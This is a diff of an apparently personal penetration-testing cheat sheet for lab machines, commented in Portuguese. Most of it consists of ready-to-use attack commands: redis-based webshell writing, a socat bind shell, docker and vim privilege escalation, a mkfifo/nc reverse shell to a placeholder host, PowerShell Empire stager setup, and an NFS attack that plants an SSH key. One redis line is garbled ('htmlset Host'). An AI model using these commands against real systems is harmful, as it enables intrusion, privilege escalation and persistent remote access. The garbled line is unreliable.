@@ -1,10 +1,10 @@
-my ip = 10.2.29.121
-ip machine = 10.10.120.119
+my ip = 10.6.8.59
+ip machine = 10.10.40.219
 
 
 
 
-BRUNO FRAGA É RUIM!
+I Love XPSec!!!
 
 
 
@@ -179,7 +179,7 @@ config set dbfilename redis.php
 set test "<?php phpinfo(); ?>"
 save                                     # testar RCE em servidor com redis mal configurado
 
-config set dir /var/www/html
+config set dir /var/www/htmlset Host
 config set dbfilename redis.php
 set test "<?php phpinfo(); ?>"
 save                                     # configurar RCE em servidor com redis mal configurado
@@ -218,6 +218,40 @@ LPORT=12345
 socat TCP-LISTEN:$LPORT,reuseaddr,fork EXEC:/bin/sh,pty,stderr,setsid,sigint,sane   #bind shell com socat
 
 ssh2john <inputfilersa> > <outputfile.hash> #Fazer o john entender a chave rsa como um hash
+
+docker run -v /:/mnt --rm -it bash chroot /mnt sh   #escalação de privilegios com docker
+
+evil-winrm -i <IP_ADDRESS> -u <USERNAME>  #acessar winrm gerenciamento remoto do windows
+
+
+powershell-empire
+uselistener http
+set Host <Host IP> 
+set Port <Port Number>
+execute
+main
+usestager multi/launcher
+set Listener http
+execute  #usar no empire para windows para termos uma shell melhor
+
+Get-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion" -Name ReleaseId   #verificar versão windows 10 via PowersShell
+
+gobuster vhost -u undiscovered.thm -w ~/Documents/Lists/subdomains.lst | grep "Status: 200" | cut -d " " -f 2   #escanear subdomais com gobuster
+
+cat /etc/exports   #Quando tivermos um nfs hospedado chechar /etc/exports, caso tenhamos um diretório de usuario neste arquivo é vulneravel a elevação de priv por nfs
+useradd -m <user> -u <mesmo uid do usuario da maquina>  #copiar usuario da maquina
+sudo mount -t nfs <ip>:/home/<usuario> <caminhoquequisersalvar>  # ataque nfs criar montagem para interligar o diretorio da máquina com o nosso
+mkdir .ssh   #criar usuario .ssh após ter criado a montagem
+ssh-keygen -f <usuario>
+cat <user>.pub > .ssh/authorized_keys   #autorizar nossa chave ssh
+ssh -i <privatekeygeradacomonomedousuariogeralmente> <user>@<ip>   #acessar por fim a máquina atacada
+
+vim.basic -c ':py3 import os;os.setuid(0);os.system("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc [IP] [PORT] >/tmp/f")'   #shell com vim
+vim.basic -c ': py3 import os; os.setuid (0); os.execl ("/ bin / sh", "sh", "-c", "reset; exec sh") '  #alternativa ao comando de cima, podemos apenas pegar root na mesma sessão
+
+
+
+
 
 
 
